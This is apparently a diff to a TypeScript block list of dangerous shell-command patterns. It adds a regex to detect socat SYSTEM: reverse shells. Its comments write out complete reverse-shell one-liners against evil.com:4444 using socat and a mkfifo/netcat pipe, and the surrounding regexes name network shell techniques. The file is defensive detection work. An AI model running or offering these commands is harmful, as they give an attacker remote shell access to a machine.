@@ -440,6 +440,9 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   { pattern: /\bncat\b.*\|\s*(?:[\w./]*\/)?(?:(?:ba|z|da|k|a)?sh|fish|t?csh)\b/, category: "reverse-shell" },
   { pattern: /\/dev\/tcp\//, category: "reverse-shell" },
   { pattern: /\bsocat\b.*\bEXEC:/, category: "reverse-shell" },
+  // socat SYSTEM:cmd — invokes `sh -c cmd`, making `socat TCP:evil.com:4444 SYSTEM:bash,pty,stderr`
+  // a fully functional reverse shell with PTY support. Symmetric gap to the EXEC: guard above.
+  { pattern: /\bsocat\b.*\bSYSTEM:/, category: "reverse-shell" },
   // Reverse shell via mkfifo — `mkfifo /tmp/f; nc evil.com 4444 < /tmp/f | bash > /tmp/f 2>&1`
   // creates a named pipe to tunnel a shell session over netcat. mkfifo has no legitimate use in Bloom.
   { pattern: /\bmkfifo\b/, category: "reverse-shell" },
